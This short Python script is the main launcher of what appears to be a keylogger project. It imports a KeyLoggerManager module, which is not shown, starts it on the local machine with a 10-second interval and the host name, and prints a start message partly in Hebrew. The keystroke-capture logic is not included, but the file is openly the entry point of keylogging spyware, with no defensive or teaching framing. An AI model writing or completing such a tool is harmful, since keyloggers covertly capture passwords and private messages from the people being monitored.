import time
import socket
from KeyLoggerManager import KeyLoggerManager

if __name__ == "__main__":
    machine_name = socket.gethostname()

    manager = KeyLoggerManager(interval_seconds=10, machine_name=machine_name)
    manager.start()
    print(f"Keylogger started on {machine_name}, לחץ ESC לעצירה...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        manager.stop()
